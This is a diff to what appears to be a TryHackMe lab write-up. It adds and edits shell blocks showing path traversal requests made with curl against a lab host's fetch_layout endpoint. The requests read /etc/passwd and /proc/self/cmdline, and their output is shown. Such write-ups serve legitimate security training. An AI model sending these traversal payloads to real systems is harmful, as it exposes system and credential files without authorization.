@@ -428,7 +428,7 @@ The universal proof-of-concept target is **`/etc/passwd`** — a text file pre
 **Result:**
 
 ```shell
-┌──(kali㉿kali)-[~/nedmoeca/THM/Valenfind]
+
 └─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -506,6 +506,11 @@ Breakdown:
     - Purpose: This file separates its fields with invisible **null bytes** (zero-value characters). Forcing raw output ensures curl prints the content even though the fields will appear mashed together, which is expected.
 
 Result:
+
+```shell
+└─$ curl "http://10.49.188.115:5000/api/fetch_layout?layout=../../../../../../proc/self/cmdline" --output -       
+/usr/bin/python3/opt/Valenfind/app.py   
+```
 <div align="center">
 <br>
 <br>
